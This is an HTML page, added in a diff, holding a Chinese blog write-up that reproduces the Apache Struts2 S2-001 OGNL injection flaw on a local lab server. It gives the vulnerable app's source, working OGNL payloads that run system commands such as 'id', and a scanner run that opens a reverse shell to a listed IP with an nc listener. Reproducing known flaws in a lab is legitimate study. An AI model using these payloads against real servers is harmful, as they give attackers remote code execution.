@@ -1,0 +1,538 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#33363b">
+    <meta name="msapplication-TileColor" content="#33363b">
+    
+    
+    
+    
+    <meta name="keywords" content="Life, ARIA, Hexo">
+    
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/favicons/apple-touch-icon.png">
+    
+    
+    <link rel="icon" type="image/png" sizes="192x192" href="/favicons/android-chrome-192x192.png">
+    
+    
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicons/favicon-32x32.png">
+    
+    
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicons/favicon-16x16.png">
+    
+    
+    <link rel="mask-icon" href="/favicons/safari-pinned-tab.svg" color="#33363b">
+    
+    
+    <link rel="manifest" href="/favicons/site.webmanifest">
+    
+    
+    <meta name="msapplication-config" content="/favicons/browserconfig.xml">
+    
+    
+    <link rel="alternate" href="/atom.xml" title="Kuiba's blog" type="application/atom+xml" />
+    
+    
+    <link rel="shortcut icon" type="image/x-icon" href="/favicons/favicon.ico">
+    
+    
+    <link rel="stylesheet" type="text/css" href="/css/normalize.css">
+    <link rel="stylesheet" type="text/css" href="/css/index.css">
+    
+    <link rel="stylesheet" type="text/css" href="/css/sidebar.css">
+    
+    
+<link rel="stylesheet" type="text/css" href="/css/page.css">
+<link rel="stylesheet" type="text/css" href="/css/post.css">
+
+    <link rel="stylesheet" type="text/css" href="/css/custom.css">
+    <link rel="stylesheet" type="text/css" href="/css/atom-one-dark.css">
+    <link rel="stylesheet" type="text/css" href="/css/lightgallery.min.css">
+    <script type="text/javascript" src="/js/jquery.min.js"></script>
+    <script defer type="text/javascript" src="/js/util.js"></script>
+    <script defer type="text/javascript" src="/js/clipboard.min.js"></script>
+    <script defer type="text/javascript" src="/js/scrollspy.js"></script>
+    <script defer type="text/javascript" src="/js/fontawesome-all.min.js"></script>
+    <script defer type="text/javascript" src="/js/lightgallery.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-fullscreen.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-hash.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-pager.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-thumbnail.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-zoom.min.js"></script>
+    
+    <script defer src="/js/busuanzi.pure.mini.js"></script>
+    
+    
+    <script defer type="text/javascript" src="/js/search.js"></script>
+    <script type="text/javascript">
+    $(document).ready(function () {
+      var searchPath = "search.xml";
+      if (searchPath.length === 0) {
+        searchPath = "search.xml";
+      }
+      var path = "/" + searchPath;
+      searchFunc(path, "search-input", "search-result");
+    });
+    </script>
+    
+    
+    <script defer type="text/javascript" src="/js/index.js"></script>
+    <script type="text/javascript">
+    $(document).ready(function () {
+      var cb = null;
+      var els = $(".post figure.highlight");
+      if (els.length) {
+        // Enabled Hexo highlight line number.
+        $(els).each(function (i, e) {
+          // $(e).before("<button class=\"copy button\">clipboard.copy</button>");
+          $(e).before([
+            "<div class=\"code-titlebar\">",
+              "<div class=\"titlebar-left\">",
+                "<button class=\"copy\" aria-label=\"clipboard.copy\"><i class=\"far fa-copy\"></i></button>",
+              "</div>",
+              "<div class=\"titlebar-center\">",
+                "code",
+              "</div>",
+              "<div class=\"titlebar-right\">",
+                "<button class=\"button-dot dot-minimize\" aria-label=\"Decoration\"></button>",
+                "<button class=\"button-dot dot-maximize\" aria-label=\"Decoration\"></button>",
+                "<button class=\"button-dot dot-close\" aria-label=\"Decoration\"></button>",
+              "</div>",
+            "</div>"
+          ].join(""));
+        });
+        cb = new ClipboardJS("button.copy", {
+          "target": function (trigger) {
+              // Get target element by DOM API.
+              return trigger.parentNode.parentNode.nextElementSibling.firstChild.firstChild.firstChild.lastChild.firstChild.firstChild;
+          }
+        });
+      } else {
+        // Disabled Hexo highlight line number.
+        els = $(".post pre code");
+        $(els).each(function (i, e) {
+          // Add button before pre, not code.
+          // $(e).parent().before("<button class=\"copy button\">clipboard.copy</button>");
+          $(e).before([
+            "<div class=\"code-titlebar\">",
+              "<div class=\"titlebar-left\">",
+                "<button class=\"copy\" aria-label=\"clipboard.copy\"><i class=\"far fa-copy\"></i></button>",
+              "</div>",
+              "<div class=\"titlebar-center\">",
+                "code",
+              "</div>",
+              "<div class=\"titlebar-right\">",
+                "<button class=\"button-dot dot-minimize\" aria-label=\"Decoration\"></button>",
+                "<button class=\"button-dot dot-maximize\" aria-label=\"Decoration\"></button>",
+                "<button class=\"button-dot dot-close\" aria-label=\"Decoration\"></button>",
+              "</div>",
+            "</div>"
+          ].join(""));
+        });
+        cb = new ClipboardJS("button.copy", {
+          "target": function (trigger) {
+              // Get target element by DOM API.
+              return trigger.parentNode.parentNode.nextElementSibling;
+          }
+        });
+      }
+      cb.on("success", function (e) {
+        e.clearSelection();
+        var trigger = e.trigger;
+        // Change button text as a user tip.
+        trigger.innerHTML = "<i class=\"far fa-check-square\"></i>";
+        $(trigger).addClass("copied");
+        // Change button text back;
+        setTimeout(function () {
+          trigger.innerHTML = "<i class=\"far fa-copy\"></i>";
+          $(trigger).removeClass("copied");
+        }, 1500);
+      });
+    });
+    </script>
+    
+    <script defer type="text/javascript" src="/js/custom.js"></script>
+    <title>S2-001复现 | Kuiba's blog - Listen to your own voice</title>
+  <meta name="generator" content="Hexo 4.2.1"></head>
+  <body itemscope itemtype="http://schema.org/WebPage" lang="zh_CN"  data-spy="scroll" data-target=".list-group">
+    
+<header id="header" class="header" style="background: #33363b;">
+  <div class="container">
+    <div class="header-container">
+      <div class="header-title">
+        <h1 class="title"><a href="/">Kuiba's blog</a></h1>
+        <h2 class="subtitle">Listen to your own voice</h2>
+      </div>
+      
+    </div>
+    <nav id="nav" class="nav">
+      <a id="nav-toggle" class="nav-toggle" aria-hidden="true"><i class="fas fa-bars" aria-label="切换导航栏"></i></a>
+      <ul id="menu" role="menubar" aria-hidden="false">
+        
+        <li role="menuitem"><a href="/">首页</a></li>
+        
+        <li role="menuitem"><a href="/archives/">归档</a></li>
+        
+        <li role="menuitem"><a href="/tags/">标签</a></li>
+        
+        <li role="menuitem"><a href="/categories/%E6%8A%80%E6%9C%AF%E6%B0%B4%E6%96%87/">技术水文</a></li>
+        
+        <li role="menuitem"><a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a></li>
+        
+        <li role="menuitem"><a href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/">编程语言</a></li>
+        
+        <li role="menuitem"><a href="/categories/%E8%BD%AC%E8%BD%BD%E6%90%AC%E8%BF%90/">转载搬运</a></li>
+        
+        <li role="menuitem"><a href="/categories/HTB%E6%90%AC%E8%BF%90/">HTB搬运</a></li>
+        
+        <li role="menuitem"><a href="/categories/%E6%9D%82%E9%A1%B9/">杂项</a></li>
+        
+        <li role="menuitem"><a href="/about/">关于</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</header>
+
+
+    <main id="main" class="main">
+      <div class="container">
+        <div class="main-container">
+          <div class="content">
+            
+<div id="post" class="page">
+  
+  <article class="article post card" itemscope itemtype="http://schema.org/Article">
+    <div class="post-block">
+      <link itemprop="mainEntityOfPage" href="https://kuibarj.top/posts/41ac148a.html">
+      <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+       <meta itemprop="name" content="Kuiba">
+       <meta itemprop="description" content="这是一个最好的时代，也是最坏的时代，我们亲身经历着激动人心的变革，也往往会陷入选择的迷茫。">
+       <meta itemprop="image" content="/images/avatar.jpg">
+      </span>
+      <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+       <meta itemprop="name" content="Kuiba's blog">
+      </span>
+    </div>
+
+    <header class="post-header">
+      <h1 class="post-title" itemprop="name headline">S2-001复现</h1>
+      <div class="post-meta">
+        
+        <span class="post-date">
+          <i class="far fa-calendar-plus"></i><span><time title="post-date" itemprop="dateCreated datePublished" datetime="2021-03-27T05:49:04+08:00">2021-03-27 05:49:04</time></span>
+        </span>
+        
+        
+        
+        <span class="post-meta-divider divider">|</span>
+        
+        <span class="post-categories">
+          
+          <i class="far fa-folder-open"></i><span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a></span>
+        </span>
+        
+        
+      </div>
+    </header>
+    <main class="post-main" itemprop="articleBody">
+      <script src="\assets\js\APlayer.min.js"> </script><p><img src="https://z3.ax1x.com/2021/03/27/6x3rhF.png" alt="image-20210310000217881"></p>
+<a id="more"></a>
+
+<h1 id="S2-001漏洞复现"><a href="#S2-001漏洞复现" class="headerlink" title="S2-001漏洞复现"></a>S2-001漏洞复现</h1><h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p>​    <a href="https://cwiki.apache.org/confluence/display/WW/S2-001" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-001</a></p>
+<p>​    由于OGNL表达式的递归执行，造成了命令执行。</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>​    Kali Linux</p>
+<p>​    IntelliJ Idea 2020.3.2</p>
+<p>​    Apache-Tomcat/9.0.43</p>
+<p>​    Java Open JDK 8</p>
+<p>先给IDEA装struts 2插件：</p>
+<p><img src="https://z3.ax1x.com/2021/03/27/6x3Efe.png" alt="image-20210302141314465"></p>
+<p>新建项目：</p>
+<p><img src="https://z3.ax1x.com/2021/03/27/6x3eld.png" alt="image-20210302141636891"></p>
+<p>下载strust2 jar，解压提取lib内的jar。</p>
+<p><a href="https://archive.apache.org/dist/struts/binaries/struts-2.0.1-all.zip" target="_blank" rel="noopener">https://archive.apache.org/dist/struts/binaries/struts-2.0.1-all.zip</a></p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">commons-logging-1.0.4.jar<br>freemarker-2.3.4.jar<br>ognl-2.6.7.jar<br>struts2-api-2.0.1.jar<br>struts2-core-2.0.1.jar<br>xwork-2.0-beta-1.jar<br></code></pre></td></tr></table></figure>
+
+<p>在 <code>WEB-INF</code> 下创建 <code>lib</code> 目录，放入所需的jar包。</p>
+<p>导入依赖包到项目中：</p>
+<p>​        左键IDEA左上角，文件-项目结构-模块 添加依赖的jar，勾选然后确定。</p>
+<p><img src="https://z3.ax1x.com/2021/03/27/6x3ZSH.png" alt="image-20210302143235678"></p>
+<p><code>src</code> 下新建 <code>com.demo.action</code> 包，包下再新建 <code>LoginAction</code>  java类，代码如下：</p>
+<figure class="hljs highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.demo.action;<br><br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionSupport;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LoginAction</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ActionSupport</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> String username = <span class="hljs-keyword">null</span>;<br>    <span class="hljs-keyword">private</span> String password = <span class="hljs-keyword">null</span>;<br><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getUsername</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.username;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getPassword</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.password;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setUsername</span><span class="hljs-params">(String username)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.username = username;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setPassword</span><span class="hljs-params">(String password)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.password = password;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">execute</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">this</span>.username.isEmpty()) || (<span class="hljs-keyword">this</span>.password.isEmpty())) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">"error"</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">this</span>.username.equalsIgnoreCase(<span class="hljs-string">"admin"</span>))<br>                &amp;&amp; (<span class="hljs-keyword">this</span>.password.equals(<span class="hljs-string">"admin"</span>))) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">"success"</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">"error"</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><code>src</code> 目录下新建 <code>struts.xml</code> ，内容如下：</p>
+<figure class="hljs highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">struts</span> <span class="hljs-meta-keyword">PUBLIC</span></span><br><span class="hljs-meta">        <span class="hljs-meta-string">"-//Apache Software Foundation//DTD Struts Configuration 2.0//EN"</span></span><br><span class="hljs-meta">        <span class="hljs-meta-string">"http://struts.apache.org/dtds/struts-2.0.dtd"</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">struts</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"S2-001"</span> <span class="hljs-attr">extends</span>=<span class="hljs-string">"struts-default"</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"login"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"com.demo.action.LoginAction"</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"success"</span>&gt;</span>welcome.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"error"</span>&gt;</span>index.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">struts</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><code>web</code> 目录下新建 <code>welcome.jsp</code> 文件,内容如下：</p>
+<figure class="hljs highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page language=<span class="hljs-string">"java"</span> contentType=<span class="hljs-string">"text/html; charset=UTF-8"</span> pageEncoding=<span class="hljs-string">"UTF-8"</span> %&gt;<br>&lt;%@ taglib prefix=<span class="hljs-string">"s"</span> uri=<span class="hljs-string">"/struts-tags"</span> %&gt;<br>&lt;!DOCTYPE html PUBLIC <span class="hljs-string">"-//W3C//DTD HTML 4.01 Transitional//EN"</span> <span class="hljs-string">"http://www.w3.org/TR/html4/loose.dtd"</span>&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;meta http-equiv=<span class="hljs-string">"Content-Type"</span> content=<span class="hljs-string">"text/html; charset=UTF-8"</span>&gt;<br>    &lt;title&gt;S2-001&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;p&gt;Hello &lt;s:property value="username"&gt;&lt;/s:property&gt;&lt;/p&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
+
+<p>修改 <code>index.jsp</code> 文件内容：</p>
+<figure class="hljs highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page language=<span class="hljs-string">"java"</span> contentType=<span class="hljs-string">"text/html; charset=UTF-8"</span> pageEncoding=<span class="hljs-string">"UTF-8"</span> %&gt;<br>&lt;%@ taglib prefix=<span class="hljs-string">"s"</span> uri=<span class="hljs-string">"/struts-tags"</span> %&gt;<br>&lt;!DOCTYPE html PUBLIC <span class="hljs-string">"-//W3C//DTD HTML 4.01 Transitional//EN"</span> <span class="hljs-string">"http://www.w3.org/TR/html4/loose.dtd"</span>&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;meta http-equiv=<span class="hljs-string">"Content-Type"</span> content=<span class="hljs-string">"text/html; charset=UTF-8"</span>&gt;<br>    &lt;title&gt;S2-001&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h2&gt;S2-001 Demo&lt;/h2&gt;<br>&lt;p&gt;link: &lt;a href=<span class="hljs-string">"https://cwiki.apache.org/confluence/display/WW/S2-001"</span>&gt;https:<span class="hljs-comment">//cwiki.apache.org/confluence/display/WW/S2-001&lt;/a&gt;</span><br>&lt;/p&gt;<br>&lt;s:form action=<span class="hljs-string">"login"</span>&gt;<br>    &lt;s:textfield name=<span class="hljs-string">"username"</span> label=<span class="hljs-string">"username"</span>/&gt;<br>    &lt;s:textfield name=<span class="hljs-string">"password"</span> label=<span class="hljs-string">"password"</span>/&gt;<br>    &lt;s:submit&gt;&lt;/s:submit&gt;<br>&lt;/s:form&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
+
+<p>修改 <code>web.xml</code> 文件内容：</p>
+<figure class="hljs highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">"http://xmlns.jcp.org/xml/ns/javaee"</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd"</span></span><br><span class="hljs-tag">         <span class="hljs-attr">id</span>=<span class="hljs-string">"WebApp_ID"</span> <span class="hljs-attr">version</span>=<span class="hljs-string">"3.1"</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">display-name</span>&gt;</span>S2-001 Example<span class="hljs-tag">&lt;/<span class="hljs-name">display-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>struts2<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>org.apache.struts2.dispatcher.FilterDispatcher<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>struts2<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/*<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">filter-mapping</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file-list</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>index.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file-list</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>运行/调试配置，配置好jdk/tomcat所在目录：</p>
+<p><img src="https://z3.ax1x.com/2021/03/27/6x3AYD.png" alt="image-20210302150359586"></p>
+<p>构建项目然后运行（可以选择D bug模式），访问web页面：</p>
+<p><img src="https://z3.ax1x.com/2021/03/27/6x3Kmt.png" alt="image-20210302151129812"></p>
+<h2 id="复现attack"><a href="#复现attack" class="headerlink" title="复现attack"></a>复现attack</h2><p>​    验证，password输入<code>%{6+6}</code> 提交执行返回 <code>12</code>,即表示OGNL表达式被执行，漏洞存在。</p>
+<p><img src="https://z3.ax1x.com/2021/03/27/6x3M0P.png" alt="image-20210309225131476"></p>
+<p>使用以下Payload执行下命令查看下web路径？</p>
+<figure class="hljs highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">%&#123;#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#response.println(#req.getRealPath('/')),#response.flush(),#response.close()&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://z3.ax1x.com/2021/03/27/6x3QTf.png" alt="image-20210309232849553"></p>
+<p><img src="https://z3.ax1x.com/2021/03/27/6x31k8.png" alt="image-20210309233014237"></p>
+<p>OWASP ZAP用不习惯，直接用 <code>HackBar</code> 吧：</p>
+<figure class="hljs highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;"id"&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://z3.ax1x.com/2021/03/27/6x3nOI.png" alt="image-20210309233928172"></p>
+<p>使用工具</p>
+<p><a href="https://github.com/HatBoy/Struts2-Scan" target="_blank" rel="noopener">https://github.com/HatBoy/Struts2-Scan</a></p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 Struts2Scan.py -u http://localhost:8080/S2_001_war_exploded/login.action -d <span class="hljs-string">"name=admin&amp;password=&#123;exp&#125;"</span> -n <span class="hljs-string">"S02-001"</span> --<span class="hljs-built_in">exec</span><br></code></pre></td></tr></table></figure>
+
+<p>漏洞存在，但不支持利用？</p>
+<p><img src="https://z3.ax1x.com/2021/03/27/6x3rhF.png" alt="image-20210310000217881"></p>
+<p>修改脚本1502行即可正常运行：<br><code>if name not in s2_list:</code> 为 <code> if name not in s2_dict:</code></p>
+<p>反弹shell</p>
+<figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Tools/Sturts2/Struts2-Scan]<br>└─$ python3 Struts2Scan.py -u http://localhost:8080/S2_001_war_exploded/login.action -n S2-001 --reverse 192.168.176.1:8000  <br><br> ____  _              _       ____    ____                                                                              <br>/ ___|| |_ _ __ _   _| |_ ___|___ \  / ___|  ___ __ _ _ __                                                              <br>\___ \| __| <span class="hljs-string">'__| | | | __/ __| __) | \___ \ / __/ _` | '</span>_ \                                                             <br> ___) | |_| |  | |_| | |_\__ \/ __/   ___) | (_| (_| | | | |                                                            <br>|____/ \__|_|   \__,_|\__|___/_____| |____/ \___\__,_|_| |_|                                                            <br>                                                                                                                        <br>                                      Author By HatBoy                                                                  <br>                                                                                                                        <br>[*] 请在反弹地址处监听端口如: nc -lvvp 8080<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://z3.ax1x.com/2021/03/27/6x3BkT.png" alt="image-20210310002603451"></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>​    略</p>
+
+    </main>
+    <div class="copy">
+      
+        
+  <br/>
+  <div style="text-align:center;color:#ccc;font-size:14px;">
+    ------ 本文结束 ------
+  </div>
+  <br/>
+  <div class="my_post_copyright" style="border:1px solid black;background-color:#f9f9f9">
+  	<div style="margin-left:24px">
+  	  <script src="https:////cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  	  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+  	  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  	  <p><span>本文标题:</span><a href="/posts/41ac148a.html">S2-001复现</a></p>
+  	  <p><span>文章作者:</span><a href="/" title="访问 Kuiba 的个人博客">Kuiba</a></p>
+  	  <p><span>发布时间:</span>2021年03月27日 - 05:03</p>
+  	  <!--<p><span>最后更新:</span>2021年03月27日 - 05:03</p>-->
+  	  <p><span>原始链接:</span><a href="/posts/41ac148a.html" title="S2-001复现">https://kuibarj.top/posts/41ac148a.html</a>
+  	    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://kuibarj.top/posts/41ac148a.html"  aria-label="复制成功！"></i></span>
+  	  </p>
+  	  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">Attribution-NonCommercial-NoDerivatives 4.0</a> 转载请保留原文链接及作者。</p>  
+  	</div>
+  </div>
+  <br/>
+  <script> 
+      var clipboard = new Clipboard('.fa-clipboard');
+        $(".fa-clipboard").click(function(){
+        clipboard.on('success', function(){
+          swal({   
+            title: "",   
+            text: '复制成功',
+            icon: "success", 
+            showConfirmButton: true
+            });
+          });
+      });  
+  </script>
+
+      
+    </div>
+    <footer class="post-footer">
+      
+      <div class="post-tags">
+        
+        <a class="post-tag button" href="/tags/CVE-2007-4556/" rel="tag"><i class="fas fa-tags"></i>CVE-2007-4556</a>
+        
+        <a class="post-tag button" href="/tags/Struts2/" rel="tag"><i class="fas fa-tags"></i>Struts2</a>
+        
+      </div>
+      
+    </footer>
+  </article>
+  
+  
+  <nav class="page-nav">
+    <div class="page-nav-next page-nav-item">
+      
+      <a href="/posts/c8e756ab.html" rel="prev" title="某云课堂RSA加密登陆爆破小记"><i class="fas fa-angle-left"></i><span class="nav-title">某云课堂RSA加密登陆爆破小记</span></a>
+      
+    </div>
